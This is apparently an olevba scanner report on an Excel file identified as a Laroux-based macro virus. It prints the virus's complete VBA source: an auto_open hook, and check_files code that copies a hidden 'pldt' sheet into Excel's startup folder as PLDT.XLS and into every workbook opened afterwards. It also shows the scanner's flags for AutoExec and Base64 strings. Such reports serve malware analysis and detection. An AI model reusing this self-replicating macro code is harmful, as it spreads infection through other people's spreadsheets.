olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-bb96513b7c94dd238a9b4b608705a7d588cdb597
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO pldt.bas 
in file: Virus.MSExcel.Laroux-based-bb96513b7c94dd238a9b4b608705a7d588cdb597 - OLE stream: '_VBA_PROJECT_CUR/VBA/pldt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    
    Application.OnSheetActivate = "check_files"

'    wbook$ = ActiveWorkbook.Name
'    If wbook$ = "4300 Rack" Then
'        Workbooks(wbook$).Calculation = xlManual
'    Else
'    End If


End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PLDT.XLS")
    If m$ = "PLDT.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("pldt").Visible = True
    Sheets("pldt").Select
    Sheets("pldt").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PLDT.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("pldt").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "pldt" Then
        Workbooks("PLDT.XLS").Sheets("pldt").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("pldt").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case Else
End Select
End Sub

Function Chkdgt(ByVal acctnbr As String) As Variant

Dim fstnine As String
Dim m As Integer
Dim totalnumtoadd As String
Dim f As Integer
Dim chkdigcalc As Integer
'********************************
'Check Digit Calculation
'********************************
fstnine = Left$(acctnbr, 9)
For m = 1 To 9
    Select Case m
        Case 1, 3, 5, 7, 9
            totalnumtoadd = totalnumtoadd & Format$(Val(Mid$(fstnine, m, 1)) * 2, "00")
        Case 2, 4, 6, 8
            totalnumtoadd = totalnumtoadd & Mid$(fstnine, m, 1)
    End Select
Next m
For f = 1 To Len(totalnumtoadd)
    chkdigcalc = chkdigcalc + Val(Mid$(totalnumtoadd, f, 1))
Next f
chkdigcalc = 100 - chkdigcalc
'*********************************
Chkdgt = Left(acctnbr, 3) & "-" & Mid(acctnbr, 4, 5) & "-" & Right(acctnbr, 1) & "-" & Right$(chkdigcalc, 1)

End Function


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  pld
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

